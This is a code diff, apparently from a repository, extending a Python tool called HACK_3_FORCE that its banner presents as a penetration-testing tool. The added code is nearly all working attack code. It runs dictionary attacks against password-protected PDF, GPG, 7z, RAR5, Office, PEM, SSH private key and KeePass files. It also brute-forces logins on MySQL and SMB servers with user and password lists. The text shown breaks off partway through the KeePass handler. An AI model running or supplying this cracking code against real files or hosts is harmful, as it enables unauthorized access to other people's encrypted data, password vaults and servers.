@@ -19,6 +19,17 @@ import threading
 import multiprocessing
 import itertools
 import string
+import pymysql 
+import pikepdf
+import subprocess
+import msoffcrypto
+import io
+
+
+from pykeepass import PyKeePass
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.backends import default_backend
+
 
 counter = None
 found_flag = None
@@ -75,7 +86,7 @@ def banner():
           "[!] Any unauthorized, illegal, or malicious use is strictly prohibited and may constitute a criminal offense.\n"
           "[!] The creator of this tool take no responsibility for misuse or any resulting damage.\n" + Colors.ENDC)
     print(Colors.FAIL + Colors.BOLD + "by David Dvora" + Colors.ENDC)
-    print(Colors.FAIL + Colors.BOLD + "Version: v1.0\n" + Colors.ENDC)
+    print(Colors.FAIL + Colors.BOLD + "Version: v2.0\n" + Colors.ENDC)
     
 def md4_hash(input_bytes):
     return hashlib.new('md4', input_bytes).hexdigest()
@@ -382,7 +393,7 @@ def try_rar_password(rar_path, password, verbose=False):
         with rarfile.RarFile(rar_path) as rf:
             rf.extractall(pwd=password)
         return True
-    except rarfile.RarWrongPassword: # Bad Rar file!
+    except rarfile.RarWrongPassword as e: # Bad Rar file!
         if verbose:
             print(f"{Colors.WARNING}[!] Bad RAR file: {e}{Colors.ENDC}")
         return False
@@ -464,15 +475,280 @@ def brute_force_parallel_archive(archive_path, archive_type='zip',
             return res
     return None
 
+def try_pdf_password(pdf_path, password, verbose=False):
+    try:
+        with pikepdf.open(pdf_path, password=password):
+            return True
+    except pikepdf.PasswordError:
+        if verbose:
+            print(f"{Colors.FAIL}[-] Password '{password}' failed for PDF{Colors.ENDC}")
+        return False
+    except Exception as e:
+        if verbose:
+            print(f"{Colors.WARNING}[!] Error testing PDF password '{password}': {e}{Colors.ENDC}")
+        return False
+
+def try_ssh_private_key_password(key_path, password, verbose=False):
+    import paramiko
+    try:
+        key = paramiko.RSAKey.from_private_key_file(key_path, password=password)
+        if verbose:
+            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for SSH private key{Colors.ENDC}")
+        return True
+    except paramiko.ssh_exception.PasswordRequiredException:
+        if verbose:
+            print(f"{Colors.WARNING}[!] Password required for SSH private key but none provided.{Colors.ENDC}")
+        return False
+    except paramiko.ssh_exception.SSHException:
+        if verbose:
+            print(f"{Colors.FAIL}[-] Password '{password}' failed for SSH private key{Colors.ENDC}")
+        return False
+    except Exception as e:
+        if verbose:
+            print(f"{Colors.WARNING}[!] Error testing SSH private key password '{password}': {e}{Colors.ENDC}")
+        return False
+
+def try_gpg_password(gpg_path, password, verbose=False):
+    try:
+        cmd = ['gpg', '--batch', '--yes', '--passphrase', password, '-d', gpg_path]
+        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
+        if result.returncode == 0:
+            if verbose:
+                print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for GPG file{Colors.ENDC}")
+            return True
+        else:
+            if verbose:
+                print(f"{Colors.FAIL}[-] Password '{password}' failed for GPG file{Colors.ENDC}")
+            return False
+    except subprocess.TimeoutExpired:
+        if verbose:
+            print(f"{Colors.WARNING}[!] Timeout testing password '{password}' for GPG file{Colors.ENDC}")
+        return False
+    except Exception as e:
+        if verbose:
+            print(f"{Colors.WARNING}[!] Error testing GPG password '{password}': {e}{Colors.ENDC}")
+        return False
+
+def try_7z_password(archive_path, password, verbose=False):
+    try:
+        cmd = ['7z', 't', f'-p{password}', '-y', archive_path]
+        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=15)
+        if result.returncode == 0:
+            if verbose:
+                print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for 7z archive{Colors.ENDC}")
+            return True
+        else:
+            if verbose:
+                print(f"{Colors.FAIL}[-] Password '{password}' failed for 7z archive{Colors.ENDC}")
+            return False
+    except subprocess.TimeoutExpired:
+        if verbose:
+            print(f"{Colors.WARNING}[!] Timeout testing password '{password}' for 7z archive{Colors.ENDC}")
+        return False
+    except Exception as e:
+        if verbose:
+            print(f"{Colors.WARNING}[!] Error testing 7z password '{password}': {e}{Colors.ENDC}")
+        return False
+
+def try_rar5_password(archive_path, password, verbose=False):
+    try:
+        cmd = ['unrar', 't', f'-p{password}', archive_path]
+        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=15)
+        if result.returncode == 0:
+            if verbose:
+                print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for RAR5 archive{Colors.ENDC}")
+            return True
+        else:
+            if verbose:
+                print(f"{Colors.FAIL}[-] Password '{password}' failed for RAR5 archive{Colors.ENDC}")
+            return False
+    except subprocess.TimeoutExpired:
+        if verbose:
+            print(f"{Colors.WARNING}[!] Timeout testing password '{password}' for RAR5 archive{Colors.ENDC}")
+        return False
+    except Exception as e:
+        if verbose:
+            print(f"{Colors.WARNING}[!] Error testing RAR5 password '{password}': {e}{Colors.ENDC}")
+        return False
+
+def try_doc_password(doc_path, password, verbose=False):
+    try:
+        with open(doc_path, 'rb') as f:
+            office_file = msoffcrypto.OfficeFile(f)
+            if not office_file.is_encrypted():
+                if verbose:
+                    print(f"{Colors.WARNING}[!] Document is not password protected.{Colors.ENDC}")
+                return False
+            office_file.load_key(password=password)
+            decrypted = io.BytesIO()
+            office_file.decrypt(decrypted)
+        if verbose:
+            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for document{Colors.ENDC}")
+        return True
+    except Exception as e:
+        if verbose:
+            print(f"{Colors.FAIL}[-] Password '{password}' failed for document: {e}{Colors.ENDC}")
+        return False
+
+def try_docx_password(docx_path, password, verbose=False):
+    try:
+        with open(docx_path, 'rb') as f:
+            office_file = msoffcrypto.OfficeFile(f)
+            if not office_file.is_encrypted():
+                if verbose:
+                    print(f"{Colors.WARNING}[!] Document is not password protected.{Colors.ENDC}")
+                return False
+            office_file.load_key(password=password)
+            decrypted = io.BytesIO()
+            office_file.decrypt(decrypted)
+        if verbose:
+            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for DOCX file{Colors.ENDC}")
+        return True
+    except Exception as e:
+        if verbose:
+            print(f"{Colors.FAIL}[-] Password '{password}' failed for DOCX file: {e}{Colors.ENDC}")
+        return False
+
+def try_xls_password(xls_path, password, verbose=False):
+    try:
+        with open(xls_path, 'rb') as f:
+            office_file = msoffcrypto.OfficeFile(f)
+            if not office_file.is_encrypted():
+                if verbose:
+                    print(f"{Colors.WARNING}[!] Excel file is not password protected.{Colors.ENDC}")
+                return False
+            office_file.load_key(password=password)
+            decrypted = io.BytesIO()
+            office_file.decrypt(decrypted)
+        if verbose:
+            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for Excel file{Colors.ENDC}")
+        return True
+    except Exception as e:
+        if verbose:
+            print(f"{Colors.FAIL}[-] Password '{password}' failed for Excel file: {e}{Colors.ENDC}")
+        return False
+
+def try_xlsx_password(xlsx_path, password, verbose=False):
+    try:
+        with open(xlsx_path, 'rb') as f:
+            office_file = msoffcrypto.OfficeFile(f)
+            if not office_file.is_encrypted():
+                if verbose:
+                    print(f"{Colors.WARNING}[!] XLSX file is not password protected.{Colors.ENDC}")
+                return False
+            office_file.load_key(password=password)
+            decrypted = io.BytesIO()
+            office_file.decrypt(decrypted)
+        if verbose:
+            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for XLSX file{Colors.ENDC}")
+        return True
+    except Exception as e:
+        if verbose:
+            print(f"{Colors.FAIL}[-] Password '{password}' failed for XLSX file: {e}{Colors.ENDC}")
+        return False
+
+def try_ppt_password(ppt_path, password, verbose=False):
+    try:
+        with open(ppt_path, 'rb') as f:
+            office_file = msoffcrypto.OfficeFile(f)
+            if not office_file.is_encrypted():
+                if verbose:
+                    print(f"{Colors.WARNING}[!] PowerPoint file is not password protected.{Colors.ENDC}")
+                return False
+            office_file.load_key(password=password)
+            decrypted = io.BytesIO()
+            office_file.decrypt(decrypted)
+        if verbose:
+            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for PowerPoint file{Colors.ENDC}")
+        return True
+    except Exception as e:
+        if verbose:
+            print(f"{Colors.FAIL}[-] Password '{password}' failed for PowerPoint file: {e}{Colors.ENDC}")
+        return False
+
+def try_pptx_password(pptx_path, password, verbose=False):
+    try:
+        with open(pptx_path, 'rb') as f:
+            office_file = msoffcrypto.OfficeFile(f)
+            if not office_file.is_encrypted():
+                if verbose:
+                    print(f"{Colors.WARNING}[!] PPTX file is not password protected.{Colors.ENDC}")
+                return False
+            office_file.load_key(password=password)
+            decrypted = io.BytesIO()
+            office_file.decrypt(decrypted)
+        if verbose:
+            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for PPTX file{Colors.ENDC}")
+        return True
+    except Exception as e:
+        if verbose:
+            print(f"{Colors.FAIL}[-] Password '{password}' failed for PPTX file: {e}{Colors.ENDC}")
+        return False
+
+def try_pem_password(pem_path, password, verbose=False):
+    try:
+        with open(pem_path, 'rb') as f:
+            pem_data = f.read()
+        private_key = serialization.load_pem_private_key(
+            pem_data,
+            password=password.encode('utf-8'),
+            backend=default_backend()
+        )
+        if verbose:
+            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for PEM file{Colors.ENDC}")
+        return True
+    except Exception as e:
+        if verbose:
+            print(f"{Colors.FAIL}[-] Password '{password}' failed for PEM file: {e}{Colors.ENDC}")
+        return False
+
+def try_kdb_password(kdb_path, password, verbose=False):
+    try:
+        kp = PyKeePass(kdb_path, password=password)
+        if verbose:
+            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for KeePass kdb file{Colors.ENDC}")
+        return True
+    except Exception as e:
+        if verbose:
+            print(f"{Colors.FAIL}[-] Password '{password}' failed for KeePass kdb file: {e}{Colors.ENDC}")
+        return False
+
+def try_kdbx_password(kdbx_path, password, verbose=False):
+    try:
+        kp = PyKeePass(kdbx_path, password=password)
+        if verbose:
+            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for KeePass kdbx file{Colors.ENDC}")
+        return True
+    except Exception as e:
+        if verbose:
+            print(f"{Colors.FAIL}[-] Password '{password}' failed for KeePass kdbx file: {e}{Colors.ENDC}")
+        return False
+
 def crack_archive(archive_path, archive_type, dictionary_file=None, verbose=False, processes=1):
     if dictionary_file:
-        password = dictionary_attack_archive(archive_path, archive_type, dictionary_file, verbose, processes)
-        return password
+        with open(dictionary_file, 'r', encoding='latin-1') as f:
+            passwords = [line.strip('\r\n') for line in f if line.strip()]
+        total = len(passwords)
+        for idx, password in enumerate(passwords, 1):
+            if verbose:
+                print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
+            if archive_type == 'zip':
+                success = try_zip_password(archive_path, password, verbose)
+            elif archive_type == 'rar':
+                success = try_rar_password(archive_path, password, verbose)
+            elif archive_type == 'pdf':
+                success = try_pdf_password(archive_path, password, verbose)
+            else:
+                success = False
+            if success:
+                if verbose:
+                    print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for {archive_type.upper()}{Colors.ENDC}")
+                return password
+        return None
     else:
         if verbose:
-            print(f"{Colors.WARNING}[!] No dictionary file provided, starting brute force...{Colors.ENDC}")
-        password = brute_force_parallel_archive(archive_path, archive_type, max_length=6, processes=processes, verbose=verbose)
-        return password
+            print(f"{Colors.WARNING}[!] No dictionary file provided, brute force not implemented for {archive_type.upper()}.{Colors.ENDC}")
+        return None
 
 def run_mode_3(args):
     if not (args.user and args.password_list and args.target_ip):
@@ -495,8 +771,12 @@ def run_mode_3(args):
         user, password = ssh_bruteforce(args.target_ip, user_list, pass_list, args.verbose)
     elif args.ftp:
         user, password = ftp_bruteforce(args.target_ip, user_list, pass_list, args.verbose)
+    elif args.mysql:
+        user, password = mysql_bruteforce(args.target_ip, user_list, pass_list, args.verbose)
+    elif args.smb:
+        user, password = smb_bruteforce(args.target_ip, user_list, pass_list, args.verbose)
     else:
-        print(f"{Colors.WARNING}[!]Error: You must specify one of --ssh, --ftp, or --HPF for mode 3.{Colors.ENDC}")
+        print(f"{Colors.WARNING}[!] Error: You must specify one of --ssh, --ftp, --mysql or --smb for mode 3.{Colors.ENDC}")
         import sys
         sys.exit(1)
 
@@ -590,6 +870,87 @@ def ftp_bruteforce(target_ip, user_list, pass_list, verbose=False, timeout=5):
     print(f"{Colors.WARNING}[!] Finished all passwords for user {username} without success.{Colors.ENDC}")
     return None, None
 
+def mysql_bruteforce(target_ip, user_list, pass_list, verbose=False, port=3306, timeout=5):
+    import pymysql
+    for username in user_list:
+        username = username.strip()
+        print(f"{Colors.HEADER}[*] Starting MySQL brute-force for user: {username}{Colors.ENDC}")
+        for idx, password in enumerate(pass_list, 1):
+            password = password.strip()
+            attempts = 0
+            while attempts < 3:
+                try:
+                    if verbose:
+                        print(f"{Colors.OKCYAN}[*] Trying MySQL {username}:{password}@{target_ip}:{port} ({idx}/{len(pass_list)}), attempt {attempts+1}{Colors.ENDC}")
+                    conn = pymysql.connect(host=target_ip, user=username, password=password, port=port, connect_timeout=timeout)
+                    if verbose:
+                        print(f"{Colors.OKGREEN}[+] MySQL login successful: {username}:{password}{Colors.ENDC}")
+                    conn.close()
+                    return username, password
+                except pymysql.err.OperationalError as e:
+                    if e.args[0] == 1045:
+                        if verbose:
+                            print(f"{Colors.FAIL}[-] MySQL Authentication failed for {username}:{password} ({idx}/{len(pass_list)}){Colors.ENDC}")
+                        break
+                    else:
+                        if verbose:
+                            print(f"{Colors.WARNING}[!] MySQL operational error on attempt {attempts+1}: {e}{Colors.ENDC}")
+                        attempts += 1
+                        time.sleep(1)
+                except (socket.timeout, socket.error) as e:
+                    if verbose:
+                        print(f"{Colors.WARNING}[!] Connection error on attempt {attempts+1}: {e}{Colors.ENDC}")
+                    attempts += 1
+                    time.sleep(1)
+                except Exception as e:
+                    if verbose:
+                        print(f"{Colors.WARNING}[!] Unexpected MySQL error: {e}{Colors.ENDC}")
+                    break
+            if attempts == 3 and verbose:
+                print(f"{Colors.WARNING}[!] Skipping password {password} after 3 failed connection attempts.{Colors.ENDC}")
+        print(f"{Colors.WARNING}[!] Finished all passwords for user {username} without success.{Colors.ENDC}")
+    return None, None
+
+def smb_bruteforce(target_ip, user_list, pass_list, verbose=False, timeout=5):
+    from smb.SMBConnection import SMBConnection
+    import socket
+    import time
+
+    for username in user_list:
+        username = username.strip()
+        print(f"{Colors.HEADER}[*] Starting SMB brute-force for user: {username}{Colors.ENDC}")
+        for idx, password in enumerate(pass_list, 1):
+            password = password.strip()
+            attempts = 0
+            while attempts < 3:
+                try:
+                    if verbose:
+                        print(f"{Colors.OKCYAN}[*] Trying SMB {username}:{password}@{target_ip} ({idx}/{len(pass_list)}), attempt {attempts+1}{Colors.ENDC}")
+                    conn = SMBConnection(username, password, "hackforce-client", target_ip, use_ntlm_v2=True)
+                    connected = conn.connect(target_ip, 139, timeout=timeout)
+                    if connected:
+                        if verbose:
+                            print(f"{Colors.OKGREEN}[+] SMB login successful: {username}:{password}{Colors.ENDC}")
+                        conn.close()
+                        return username, password
+                    else:
+                        if verbose:
+                            print(f"{Colors.FAIL}[-] SMB login failed for {username}:{password} ({idx}/{len(pass_list)}){Colors.ENDC}")
+                        break
+                except (socket.timeout, socket.error) as e:
+                    if verbose:
+                        print(f"{Colors.WARNING}[!] Connection error on attempt {attempts+1}: {e}{Colors.ENDC}")
+                    attempts += 1
+                    time.sleep(1)
+                except Exception as e:
+                    if verbose:
+                        print(f"{Colors.WARNING}[!] Unexpected SMB error: {e}{Colors.ENDC}")
+                    break
+            if attempts == 3 and verbose:
+                print(f"{Colors.WARNING}[!] Skipping password {password} after 3 failed connection attempts.{Colors.ENDC}")
+        print(f"{Colors.WARNING}[!] Finished all passwords for user {username} without success.{Colors.ENDC}")
+    return None, None
+
 def main():
     banner()
     parser = argparse.ArgumentParser(description="HACK_3_FORCE - Advanced Modular Brute Force Tool for Penetration Testing")
@@ -603,13 +964,29 @@ def main():
     parser.add_argument('--dictionary', help='Path to dictionary file for dictionary attack (mode 1 or 2)')
     parser.add_argument('--verbose', action='store_true', help='Enable verbose output')
     parser.add_argument('--zip2hack', help='Path to ZIP file to crack (mode 2)')
+    parser.add_argument('--a7z2hack', help='Path to 7z encrypted archive to crack (mode 2)')
     parser.add_argument('--rar2hack', help='Path to RAR file to crack (mode 2)')
+    parser.add_argument('--a5r2hack', help='Path to RAR5 encrypted archive to crack (mode 2)')
+    parser.add_argument('--gpg2hack', help='Path to GPG encrypted file to crack (mode 2)')
+    parser.add_argument('--pdf2hack', help='Path to PDF file to crack (mode 2)')
+    parser.add_argument('--doc2hack', help='Path to Word document protected to crack (mode 2)')
+    parser.add_argument('--xls2hack', help='Path to Excel document password protected to crack (mode 2)')
+    parser.add_argument('--ppt2hack', help='Path to PowerPoint document password protected to crack (mode 2)')
+    parser.add_argument('--docx2hack', help='Path to DOCX (Open XML) protected document to crack (mode 2)')
+    parser.add_argument('--xlsx2hack', help='Path to XLSX (Open XML) protected document to crack (mode 2)')
+    parser.add_argument('--pptx2hack', help='Path to PPTX (Open XML) protected document to crack (mode 2)')
+    parser.add_argument('--pem2hack', help='Path to encrypted PEM file protected to crack (mode 2)')
+    parser.add_argument('--spk2hack', help='Path to SSH private key file to crack (password protected) (mode 2)')
+    parser.add_argument('--kdb2hack', help='Path to KeePass 1.x kdb file protected to crack (mode 2)')
+    parser.add_argument('--kdbx2hack', help='Path to KeePass 2.x kdbx protected to crack (mode 2)')
     parser.add_argument('--show-pass', help='Show cracked password for given file (mode 2)')
     parser.add_argument('--user', help='Single username or path to user list file (mode 3)')
     parser.add_argument('--password-list', help='Password list file for mode 3')
     parser.add_argument('--target-ip', help='Target IP address (mode 3)')
     parser.add_argument('--ssh', action='store_true', help='Use SSH protocol (mode 3)')
     parser.add_argument('--ftp', action='store_true', help='Use FTP protocol (mode 3)')
+    parser.add_argument('--mysql', action='store_true', help='Use MySQL protocol (mode 3)')
+    parser.add_argument('--smb', action='store_true', help='Use SMB protocol (mode 3)')
     args = parser.parse_args()
 
     salt = args.salt if args.salt else None
@@ -664,6 +1041,278 @@ def main():
                 log_cracked_password(args.rar2hack, password)
             else:
                 print(f"{Colors.FAIL}[-] Failed to crack RAR password.{Colors.ENDC}")
+            return
+
+        if args.pdf2hack:
+            if args.verbose:
+                print(f"{Colors.OKCYAN}[*] Starting crack on PDF file: {args.pdf2hack}{Colors.ENDC}")
+            password = crack_archive(args.pdf2hack, 'pdf', args.dictionary, processes=args.processes, verbose=args.verbose)
+            if password:
+                print(f"{Colors.OKGREEN}[+] Cracked PDF password: {password}{Colors.ENDC}")
+                print(f"{Colors.OKBLUE}[*]the cracked password saved in cracked_passwords.log{Colors.ENDC}")
+                log_cracked_password(args.pdf2hack, password)
+            else:
+                print(f"{Colors.FAIL}[-] Failed to crack PDF password.{Colors.ENDC}")
+            return
+
+        if args.spk2hack:
+            if not args.dictionary:
+                print(f"{Colors.WARNING}[!] Dictionary file is required for --spk2hack mode.{Colors.ENDC}")
+                return
+            if args.verbose:
+                print(f"{Colors.OKCYAN}[*] Starting crack on SSH private key file: {args.spk2hack}{Colors.ENDC}")
+            with open(args.dictionary, 'r', encoding='latin-1') as f:
+                passwords = [line.strip('\r\n') for line in f if line.strip()]
+            total = len(passwords)
+            for idx, password in enumerate(passwords, 1):
+                if args.verbose:
+                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
+                if try_ssh_private_key_password(args.spk2hack, password, args.verbose):
+                    print(f"{Colors.OKGREEN}[+] Cracked SSH private key password: {password}{Colors.ENDC}")
+                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
+                    log_cracked_password(args.spk2hack, password)
+                    return
+            print(f"{Colors.FAIL}[-] Failed to crack SSH private key password.{Colors.ENDC}")
+            return
+
+        if args.gpg2hack:
+            if not args.dictionary:
+                print(f"{Colors.WARNING}[!] Dictionary file is required for --gpg2hack mode.{Colors.ENDC}")
+                return
+            if args.verbose:
+                print(f"{Colors.OKCYAN}[*] Starting crack on GPG file: {args.gpg2hack}{Colors.ENDC}")
+            with open(args.dictionary, 'r', encoding='latin-1') as f:
+                passwords = [line.strip('\r\n') for line in f if line.strip()]
+            total = len(passwords)
+            for idx, password in enumerate(passwords, 1):
+                if args.verbose:
+                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
+                if try_gpg_password(args.gpg2hack, password, args.verbose):
+                    print(f"{Colors.OKGREEN}[+] Cracked GPG password: {password}{Colors.ENDC}")
+                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
+                    log_cracked_password(args.gpg2hack, password)
+                    return
+            print(f"{Colors.FAIL}[-] Failed to crack GPG password.{Colors.ENDC}")
+            return
+
+        if args.a7z2hack:
+            if not args.dictionary:
+                print(f"{Colors.WARNING}[!] Dictionary file is required for --a7z2hack mode.{Colors.ENDC}")
+                return
+            if args.verbose:
+                print(f"{Colors.OKCYAN}[*] Starting crack on 7z archive: {args.a7z2hack}{Colors.ENDC}")
+            with open(args.dictionary, 'r', encoding='latin-1') as f:
+                passwords = [line.strip('\r\n') for line in f if line.strip()]
+            total = len(passwords)
+            for idx, password in enumerate(passwords, 1):
+                if args.verbose:
+                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
+                if try_7z_password(args.a7z2hack, password, args.verbose):
+                    print(f"{Colors.OKGREEN}[+] Cracked 7z password: {password}{Colors.ENDC}")
+                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
+                    log_cracked_password(args.a7z2hack, password)
+                    return
+            print(f"{Colors.FAIL}[-] Failed to crack 7z password.{Colors.ENDC}")
+            return
+
+        if args.a5r2hack:
+            if not args.dictionary:
+                print(f"{Colors.WARNING}[!] Dictionary file is required for --a5r2hack mode.{Colors.ENDC}")
+                return
+            if args.verbose:
+                print(f"{Colors.OKCYAN}[*] Starting crack on RAR5 archive: {args.a5r2hack}{Colors.ENDC}")
+            with open(args.dictionary, 'r', encoding='latin-1') as f:
+                passwords = [line.strip('\r\n') for line in f if line.strip()]
+            total = len(passwords)
+            for idx, password in enumerate(passwords, 1):
+                if args.verbose:
+                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
+                if try_rar5_password(args.a5r2hack, password, args.verbose):
+                    print(f"{Colors.OKGREEN}[+] Cracked RAR5 password: {password}{Colors.ENDC}")
+                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
+                    log_cracked_password(args.a5r2hack, password)
+                    return
+            print(f"{Colors.FAIL}[-] Failed to crack RAR5 password.{Colors.ENDC}")
+            return
+
+        if args.doc2hack:
+            if not args.dictionary:
+                print(f"{Colors.WARNING}[!] Dictionary file is required for --doc2hack mode.{Colors.ENDC}")
+                return
+            if args.verbose:
+                print(f"{Colors.OKCYAN}[*] Starting crack on Word document: {args.doc2hack}{Colors.ENDC}")
+            with open(args.dictionary, 'r', encoding='latin-1') as f:
+                passwords = [line.strip('\r\n') for line in f if line.strip()]
+            total = len(passwords)
+            for idx, password in enumerate(passwords, 1):
+                if args.verbose:
+                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
+                if try_doc_password(args.doc2hack, password, args.verbose):
+                    print(f"{Colors.OKGREEN}[+] Cracked document password: {password}{Colors.ENDC}")
+                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
+                    log_cracked_password(args.doc2hack, password)
+                    return
+            print(f"{Colors.FAIL}[-] Failed to crack document password.{Colors.ENDC}")
+            return
+
+        if args.docx2hack:
+            if not args.dictionary:
+                print(f"{Colors.WARNING}[!] Dictionary file is required for --docx2hack mode.{Colors.ENDC}")
+                return
+            if args.verbose:
+                print(f"{Colors.OKCYAN}[*] Starting crack on DOCX file: {args.docx2hack}{Colors.ENDC}")
+            with open(args.dictionary, 'r', encoding='latin-1') as f:
+                passwords = [line.strip('\r\n') for line in f if line.strip()]
+            total = len(passwords)
+            for idx, password in enumerate(passwords, 1):
+                if args.verbose:
+                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
+                if try_docx_password(args.docx2hack, password, args.verbose):
+                    print(f"{Colors.OKGREEN}[+] Cracked DOCX password: {password}{Colors.ENDC}")
+                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
+                    log_cracked_password(args.docx2hack, password)
+                    return
+            print(f"{Colors.FAIL}[-] Failed to crack DOCX password.{Colors.ENDC}")
+            return
+
+        if args.xls2hack:
+            if not args.dictionary:
+                print(f"{Colors.WARNING}[!] Dictionary file is required for --xls2hack mode.{Colors.ENDC}")
+                return
+            if args.verbose:
+                print(f"{Colors.OKCYAN}[*] Starting crack on Excel document: {args.xls2hack}{Colors.ENDC}")
+            with open(args.dictionary, 'r', encoding='latin-1') as f:
+                passwords = [line.strip('\r\n') for line in f if line.strip()]
+            total = len(passwords)
+            for idx, password in enumerate(passwords, 1):
+                if args.verbose:
+                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
+                if try_xls_password(args.xls2hack, password, args.verbose):
+                    print(f"{Colors.OKGREEN}[+] Cracked Excel password: {password}{Colors.ENDC}")
+                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
+                    log_cracked_password(args.xls2hack, password)
+                    return
+            print(f"{Colors.FAIL}[-] Failed to crack Excel password.{Colors.ENDC}")
+            return
+
+        if args.xlsx2hack:
+            if not args.dictionary:
+                print(f"{Colors.WARNING}[!] Dictionary file is required for --xlsx2hack mode.{Colors.ENDC}")
+                return
+            if args.verbose:
+                print(f"{Colors.OKCYAN}[*] Starting crack on XLSX document: {args.xlsx2hack}{Colors.ENDC}")
+            with open(args.dictionary, 'r', encoding='latin-1') as f:
+                passwords = [line.strip('\r\n') for line in f if line.strip()]
+            total = len(passwords)
+            for idx, password in enumerate(passwords, 1):
+                if args.verbose:
+                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
+                if try_xlsx_password(args.xlsx2hack, password, args.verbose):
+                    print(f"{Colors.OKGREEN}[+] Cracked XLSX password: {password}{Colors.ENDC}")
+                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
+                    log_cracked_password(args.xlsx2hack, password)
+                    return
+            print(f"{Colors.FAIL}[-] Failed to crack XLSX password.{Colors.ENDC}")
+            return
+
+        if args.ppt2hack:
+            if not args.dictionary:
+                print(f"{Colors.WARNING}[!] Dictionary file is required for --ppt2hack mode.{Colors.ENDC}")
+                return
+            if args.verbose:
+                print(f"{Colors.OKCYAN}[*] Starting crack on PowerPoint document: {args.ppt2hack}{Colors.ENDC}")
+            with open(args.dictionary, 'r', encoding='latin-1') as f:
+                passwords = [line.strip('\r\n') for line in f if line.strip()]
+            total = len(passwords)
+            for idx, password in enumerate(passwords, 1):
+                if args.verbose:
+                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
+                if try_ppt_password(args.ppt2hack, password, args.verbose):
+                    print(f"{Colors.OKGREEN}[+] Cracked PowerPoint password: {password}{Colors.ENDC}")
+                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
+                    log_cracked_password(args.ppt2hack, password)
+                    return
+            print(f"{Colors.FAIL}[-] Failed to crack PowerPoint password.{Colors.ENDC}")
+            return
+
+        if args.pptx2hack:
+            if not args.dictionary:
+                print(f"{Colors.WARNING}[!] Dictionary file is required for --pptx2hack mode.{Colors.ENDC}")
+                return
+            if args.verbose:
+                print(f"{Colors.OKCYAN}[*] Starting crack on PPTX document: {args.pptx2hack}{Colors.ENDC}")
+            with open(args.dictionary, 'r', encoding='latin-1') as f:
+                passwords = [line.strip('\r\n') for line in f if line.strip()]
+            total = len(passwords)
+            for idx, password in enumerate(passwords, 1):
+                if args.verbose:
+                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
+                if try_pptx_password(args.pptx2hack, password, args.verbose):
+                    print(f"{Colors.OKGREEN}[+] Cracked PPTX password: {password}{Colors.ENDC}")
+                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
+                    log_cracked_password(args.pptx2hack, password)
+                    return
+            print(f"{Colors.FAIL}[-] Failed to crack PPTX password.{Colors.ENDC}")
+            return
+
+        if args.pem2hack:
+            if not args.dictionary:
+                print(f"{Colors.WARNING}[!] Dictionary file is required for --pem2hack mode.{Colors.ENDC}")
+                return
+            if args.verbose:
+                print(f"{Colors.OKCYAN}[*] Starting crack on PEM file: {args.pem2hack}{Colors.ENDC}")
+            with open(args.dictionary, 'r', encoding='latin-1') as f:
+                passwords = [line.strip('\r\n') for line in f if line.strip()]
+            total = len(passwords)
+            for idx, password in enumerate(passwords, 1):
+                if args.verbose:
+                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
+                if try_pem_password(args.pem2hack, password, args.verbose):
+                    print(f"{Colors.OKGREEN}[+] Cracked PEM password: {password}{Colors.ENDC}")
+                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
+                    log_cracked_password(args.pem2hack, password)
+                    return
+            print(f"{Colors.FAIL}[-] Failed to crack PEM password.{Colors.ENDC}")
+            return
+
+        if args.kdb2hack:
+            if not args.dictionary:
